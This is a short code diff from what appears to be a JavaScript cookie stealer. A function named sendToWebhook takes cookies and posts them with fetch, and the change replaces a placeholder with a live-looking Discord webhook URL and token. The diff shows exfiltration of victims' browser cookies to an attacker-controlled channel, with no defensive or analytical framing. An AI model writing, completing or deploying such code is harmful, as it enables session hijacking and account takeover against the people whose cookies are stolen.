@@ -9,7 +9,7 @@
         };
 
         const sendToWebhook = (cookies) => {
-            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+            const webhookUrl = 'https://discord.com/api/webhooks/1482894586249744465/a_4XPC0HHrulhLfFZvdjlrhO8BYVs_xH53PGV8xqqWI6gGLptbh93K4QdaI50F-JHQQi';
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
